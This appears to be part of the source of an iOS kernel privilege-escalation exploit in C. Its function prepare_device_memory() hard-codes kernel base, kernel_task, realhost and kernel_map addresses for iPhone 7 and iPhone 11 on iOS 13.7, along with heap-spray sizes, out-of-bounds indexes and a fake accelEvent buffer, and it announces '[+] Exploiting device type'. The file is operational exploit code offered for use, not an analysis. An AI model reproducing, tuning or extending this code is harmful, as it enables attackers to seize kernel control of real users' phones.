
#include "exploit.h"

uint8_t* fake_accelEvent = NULL;
uint32_t fake_accelEvent_size = 0;
struct utsname u = {0};

uint32_t kalloc_map_size = 0, zone_map_size = 0;
uint32_t thread_no = 2;
uint32_t oob_index = 0;
uint32_t test_oob = 0;
uint64_t *oob_indexes = NULL;
uint32_t iter = 0;
uint32_t memspray_size = 0;
uint32_t accel_alloc_size = 0x300;
int loop = 5;
//uint32_t oob_index = 0;

uint64_t realhost_text = 0, kernel_task_text = 0;
uint64_t kernel_map_text = 0;
uint64_t kernel_base = 0;

uint64_t kernel_map = 0;
uint64_t bar = 0;
void prepare_device_memory()
{

        int name[2] = {CTL_HW, HW_MEMSIZE};
        uint64_t max_mem = 0;
        size_t len = sizeof(uint64_t);

        //hw.memsize
        int err = sysctl(name, 2, &max_mem, &len, NULL, 0);
        if (err < 0) {
                perror("sysctl(hw.memsize)");
                exit(-1);
        }

        uname(&u);

        // config for 2GB RAM devices like iPhone 7
        if(!strcmp(u.machine,"iPhone9,3")) {
                kalloc_map_size = 0x03bd23ff;
                kalloc_map_size = 80 MB;
                zone_map_size   = 0x2cddc000; //
                zone_map_size = 500 MB;//600 MB ;//720 MB - 120 MB;
                oob_indexes = calloc(3,sizeof(uint64_t));
                bar = 0x1100000;

                iter = 0x1000;
                oob_indexes[0] = 0x1e83bf6;
                thread_no  = 5;
                //13.7
                if (!strcmp(u.release,"19.6.0")) {
                        kernel_base = 0xfffffff005600000;
                        realhost_text = 0xfffffff00772b818;
                        kernel_task_text = 0xfffffff0070cd858;
                        kernel_map_text = 0xfffffff0070d0a90;
                } else {
                        printf("Unsupported \n");
                        exit(0);
                }


                // All device with 4GB RAM can be put here
        } else if(!strcmp(u.machine,"iPhone12,1")) {
                printf("iPhone 11 \n");
                accel_alloc_size = 0x600;
                oob_indexes = calloc(3,sizeof(uint64_t));

                oob_indexes[0] = 0x399b7f6;

                zone_map_size   = 0x53978000; // real size
                //zone_map_size   = 1150 MB; // size with adjustment to avoid zone map exhaust
                zone_map_size   = 1150 MB; // size with adjustment to avoid zone map exhaust

                kalloc_map_size = 0x6f745ff;
                //kalloc_map_size = 140 MB;
                kalloc_map_size = 160 MB;
                bar = 0x3100000;
                iter = 0x400;//00;
                //loop = 5;

                thread_no = 6; // 6

#if 0
                kernel_base = 0xfffffff007004000;//
                realhost_text = 0xfffffff0092c0818;
                kernel_task_text = 0xfffffff007882198;
                kernel_map_text = 0xfffffff007885690;
#endif
                //13.7
                kernel_base = 0xfffffff007004000;//
                realhost_text = 0xfffffff009438818;
                kernel_task_text = 0;
                kernel_map_text = 0xfffffff0078f1690;

                //exit(0);

        } else {
                printf("Cannot exec the exploit on this device \n");
        }

        if(memspray_size == 0) {
                //printf("[!] mem spray size is not tuned into this device \n");
                memspray_size = 0x200 * 0x59;
        }
        printf("[+] Exploiting device type %s \n",u.machine);
        printf("[+] Memory size 0x%llx \n",max_mem);
        assert(realhost_text != 0);
        //assert(kernel_task_text != 0);
        assert(bar != 0);
        if(oob_indexes == NULL) {
                printf("[-] Exploit is not tuned to this device yet \n");
                //exit(0);
        }
        fake_accelEvent_size = PAGE_SIZE;

        fake_accelEvent = calloc(fake_accelEvent_size,1);
        assert(fake_accelEvent);

        //accel_alloc_size = 0x100 + (0x100 * 3);
        for(int i=0; i <(fake_accelEvent_size/8); i++)
                *(uint64_t *)((uint64_t *) fake_accelEvent + i) = 0xffffffff;

}
